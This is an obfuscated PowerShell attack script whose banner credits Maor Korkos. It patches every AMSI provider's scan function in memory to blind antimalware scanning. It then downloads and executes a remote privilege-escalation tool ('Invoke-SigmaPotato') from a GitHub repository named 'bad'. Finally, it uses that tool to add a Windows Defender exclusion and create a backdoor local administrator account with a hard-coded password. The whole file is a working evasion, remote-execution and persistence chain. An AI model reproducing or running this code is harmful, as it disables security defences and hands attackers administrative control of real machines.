&('Write-Ho'+'st') "AMSI providers' scan interception"
Write-Host "-- Maor Korkos (@maorkor)"
Write-Host "-- 64bit implemetation"

$mHS9rr23 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIEFwaXMgew0KICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICBbRGxsSW1wb3J0KCJhbXNpIildDQogIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBBbXNpSW5pdGlhbGl6ZShzdHJpbmcgYXBwTmFtZSwgb3V0IEludDY0IGNvbnRleHQpOw0KfQ0=')))
Add-Type $mHS9rr23
$aapt = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHhCOA==')))
$qkwf = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHg1Nw==')))
$snxi = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHgwMA==')))
$wnan = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHgwNw==')))
$nchj = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHg4MA==')))
$yywa = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHhDMw==')))
$er9dDFK = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
$OgT5HF = 0; $aioCf = 0
$Z4xHzk = 8
[Int64]$znMW3A5r = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$znMW3A5r)
$IS9WjT = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$znMW3A5r, 16)
$pjAS = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$IS9WjT, 64)

# Loop through all the providers
while ($pjAS -ne 0)
{
  # Find the provider's Scan function
  $QqNQ26u =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$pjAS)
  $zJZ25f = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$QqNQ26u, 24)

  # Patch the Scan function
  Write-host "[$aioCf] Provider's scan function found!" $zJZ25f
  [APIs]::VirtualProtect($zJZ25f, [uint32]6, 0x40, [ref]$OgT5HF)
  [System.Runtime.InteropServices.Marshal]::Copy($er9dDFK, 0, [IntPtr]$zJZ25f, 6)
  
  $aioCf++
  $pjAS = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$IS9WjT, 64 + ($aioCf*$Z4xHzk))
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
